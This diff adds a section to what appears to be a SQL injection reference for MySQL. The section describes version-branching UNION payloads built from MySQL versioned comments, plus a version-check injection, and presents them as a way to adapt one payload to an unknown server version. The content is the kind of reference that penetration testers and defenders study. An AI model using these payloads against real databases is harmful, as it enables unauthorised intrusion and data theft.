@@ -36,6 +36,20 @@ SELECT /*!32302 1/0, */ 1 FROM dual
 -- If MySQL >= 3.23.02, error (division by zero)
 ```
 
+### Version Branching with UNION
+
+Use version-specific comments to create payloads that work across different MySQL versions:
+
+```sql
+-- Returns different column counts based on MySQL version
+UNION SELECT /*!50000 5,null;%00*//*!40000 4,null-- ,*//*!30000 3,null-- x*/
+
+-- Version check that returns False if version >= 5.00.94
+1 /*!50094eaea*/;
+```
+
+This technique allows a single payload to adapt to different MySQL versions, useful when the exact version is unknown.
+
 ### MySQL-specific Functions
 
 MySQL offers unique functions not available in other database systems:
